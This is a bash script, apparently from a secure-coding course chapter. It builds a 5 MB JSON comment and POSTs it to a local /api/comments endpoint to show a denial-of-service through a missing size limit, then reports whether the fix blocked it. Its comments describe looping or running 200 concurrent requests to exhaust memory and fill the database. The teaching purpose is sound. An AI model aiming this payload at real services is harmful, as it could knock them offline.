#!/usr/bin/env bash
#
# Chapter 18 — DoS via unbounded request body
#
# 1. Build a JSON payload whose `body` field is 5 MB of "A" characters
# 2. POST it to /api/comments
#    - Vulnerable controller (no @Valid, no @Size): accepts the request,
#      writes 5 MB into the database. Repeat in a loop for OOM.
#    - Fixed controller: returns 400 with a constraint violation message.

set -euo pipefail
API="${API:-http://localhost:8080}"
PRODUCT_ID='aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa'

bold() { printf '\033[1m%s\033[0m\n' "$*"; }
gray() { printf '\033[90m%s\033[0m\n' "$*"; }

bold "[1/2] Build 5 MB body payload"
PAYLOAD_FILE=$(mktemp -t evil_body.XXXXXX.json)
python3 -c "
import json, sys
body = 'A' * (5 * 1024 * 1024)   # 5 MB
print(json.dumps({
  'productId': '$PRODUCT_ID',
  'authorEmail': 'attacker@x.com',
  'body': body
}))" > "$PAYLOAD_FILE"
gray "  Payload size: $(ls -lh "$PAYLOAD_FILE" | awk '{print $5}')"
echo

bold "[2/2] POST it"
RESPONSE=$(curl -sS -o /tmp/resp.json -w '%{http_code}' \
  -X POST "${API}/api/comments" \
  -H 'Content-Type: application/json' \
  --data-binary "@${PAYLOAD_FILE}")
echo "  HTTP ${RESPONSE}"
echo "  Body (first 300 chars): $(head -c 300 /tmp/resp.json)"
echo

rm -f "$PAYLOAD_FILE"

if [ "$RESPONSE" = "400" ]; then
  bold "ATTACK BLOCKED — server enforced @Size constraint."
elif [ "$RESPONSE" = "200" ] || [ "$RESPONSE" = "201" ]; then
  bold "ATTACK SUCCEEDED — server accepted a 5 MB comment."
  echo "  In a real attack: 200 concurrent requests = 1 GB of garbage in your DB."
  exit 1
elif [ "$RESPONSE" = "413" ]; then
  bold "Request rejected by server-level body limit (Tomcat/Spring Boot multipart cap)."
  echo "  This is a partial defense — the application-level @Size constraint is still missing."
else
  bold "Unexpected response (${RESPONSE})."
  exit 2
fi
